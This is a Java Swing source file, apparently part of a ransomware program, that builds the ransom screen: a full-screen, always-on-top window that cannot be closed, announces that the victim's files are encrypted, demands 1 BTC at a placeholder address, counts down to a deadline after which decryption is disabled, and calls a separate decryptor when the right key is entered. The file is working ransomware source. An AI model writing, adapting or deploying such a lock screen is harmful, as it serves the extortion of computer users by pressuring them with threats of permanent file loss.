    import javax.swing.*;
    import java.awt.*;
    import java.io.File;

    public class RansomGUI {
        private final File folder;
        private final String key;
        private final long endTime;

        public RansomGUI(File folder, String key, long duration) {
            this.folder = folder;
            this.key = key;
            this.endTime = System.currentTimeMillis() + duration;
        }

        public void show() {
            JFrame frame = new JFrame("Your Files Have Been Encrypted");
            frame.setUndecorated(true);
            frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
            frame.setAlwaysOnTop(true);
            frame.getContentPane().setBackground(Color.BLACK);
            frame.setLayout(new GridBagLayout());
            GridBagConstraints gbc = new GridBagConstraints();
            gbc.insets = new Insets(10, 20, 10, 20);
            gbc.fill = GridBagConstraints.HORIZONTAL;
            gbc.gridx = 0;
            gbc.gridy = 0;

            // Title
            JLabel title = new JLabel("YOUR FILES HAVE BEEN ENCRYPTED", SwingConstants.CENTER);
            title.setFont(new Font("Arial", Font.BOLD, 40));
            title.setForeground(Color.RED);

            // Timer
            JLabel countdown = new JLabel("Time remaining: 00:00:00", SwingConstants.CENTER);
            countdown.setFont(new Font("Consolas", Font.BOLD, 24));
            countdown.setForeground(Color.YELLOW);

            // Instructions
            JTextArea instructions = new JTextArea(
                "All your important files have been encrypted.\n\n" +
                "To get them back, send 1 BTC to the address below:\n\n" +
                "FAKE-BTC-ADDRESS-1234567890\n\n" +
                "Then enter the decryption key you received below:"
            );
            instructions.setFont(new Font("Consolas", Font.PLAIN, 18));
            instructions.setForeground(Color.WHITE);
            instructions.setOpaque(false);
            instructions.setEditable(false);
            instructions.setHighlighter(null);
            instructions.setBorder(null);

            // Input
            JTextField inputField = new JTextField();
            inputField.setFont(new Font("Consolas", Font.BOLD, 20));
            inputField.setHorizontalAlignment(JTextField.CENTER);
            inputField.setBackground(Color.BLACK);
            inputField.setForeground(Color.RED);
            inputField.setBorder(BorderFactory.createLineBorder(Color.RED, 2));

            // Button
            JButton decryptBtn = new JButton("DECRYPT FILES");
            decryptBtn.setFont(new Font("Arial", Font.BOLD, 24));
            decryptBtn.setBackground(Color.RED.darker());
            decryptBtn.setForeground(Color.LIGHT_GRAY);
            decryptBtn.setFocusPainted(false);
            decryptBtn.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));

            decryptBtn.addActionListener(e -> {
                if (inputField.getText().trim().equals(key)) {
                    try {
                        FileEncryptor.decryptFolder(folder, key);
                        JOptionPane.showMessageDialog(frame, "Files decrypted successfully.");
                        frame.dispose();
                    } catch (Exception ex) {
                        JOptionPane.showMessageDialog(frame, "Decryption error: " + ex.getMessage());
                    }
                } else {
                    JOptionPane.showMessageDialog(frame, "Incorrect decryption key.");
                }
            });

            // Add components
            gbc.weightx = 1;
            gbc.anchor = GridBagConstraints.CENTER;

            frame.add(title, gbc);
            gbc.gridy++;
            frame.add(countdown, gbc);
            gbc.gridy++;
            frame.add(instructions, gbc);
            gbc.gridy++;
            frame.add(inputField, gbc);
            gbc.gridy++;
            frame.add(decryptBtn, gbc);

            // Countdown logic
            new Timer(1000, e -> {
                long left = endTime - System.currentTimeMillis();
                if (left > 0) {
                    long h = left / 3600000, m = (left / 60000) % 60, s = (left / 1000) % 60;
                    countdown.setText(String.format("Time remaining: %02d:%02d:%02d", h, m, s));
                } else {
                    countdown.setText("Time's up. Files are lost.");
                    inputField.setEnabled(false);
                    decryptBtn.setEnabled(false);
                    ((Timer) e.getSource()).stop();
                }
            }).start();

            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frame.setVisible(true);
        }
    }
